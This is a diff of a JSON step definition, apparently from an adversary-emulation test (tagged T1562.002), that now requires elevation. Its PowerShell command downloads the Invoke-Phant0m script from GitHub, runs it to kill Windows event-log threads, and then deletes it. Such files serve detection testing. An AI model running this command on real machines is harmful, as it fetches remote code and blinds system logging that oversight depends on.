@@ -7,38 +7,38 @@
   ],
   "steps": [
     {
-      "id": "994903b5-778a-4a8d-9f2c-16aa3bd1807f",
+      "id": "0ffba201-5944-4f07-bf57-7c59300e1a34",
       "type": "execute-command",
       "data": {
         "command": "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore\n$url = \"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1\"\n$output = \"$env:TEMP\\Invoke-Phant0m.ps1\"\n$wc = New-Object System.Net.WebClient\n$wc.DownloadFile($url, $output)\ncd $env:TEMP\nImport-Module .\\Invoke-Phant0m.ps1\nInvoke-Phant0m\n",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "8c525956-aa00-4484-99be-caf1703badce",
+      "id": "abf8663d-67cb-416d-81e7-6a1e222e9670",
       "type": "execute-command",
       "data": {
         "command": "Write-Host \"NEED TO Restart-Computer TO ENSURE LOGGING RETURNS\" -fore red\nRemove-Item \"$env:TEMP\\Invoke-Phant0m.ps1\" -ErrorAction Ignore\n",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "994903b5-778a-4a8d-9f2c-16aa3bd1807f",
+      "s": "0ffba201-5944-4f07-bf57-7c59300e1a34",
       "p": "on-success",
-      "o": "8c525956-aa00-4484-99be-caf1703badce"
+      "o": "abf8663d-67cb-416d-81e7-6a1e222e9670"
     },
     {
-      "s": "994903b5-778a-4a8d-9f2c-16aa3bd1807f",
+      "s": "0ffba201-5944-4f07-bf57-7c59300e1a34",
       "p": "on-failure",
-      "o": "8c525956-aa00-4484-99be-caf1703badce"
+      "o": "abf8663d-67cb-416d-81e7-6a1e222e9670"
     }
   ],
   "tags": [
-    "T1562.002",
-    "atomic-red-team"
+    "T1562",
+    "T1562.002"
   ]
 }
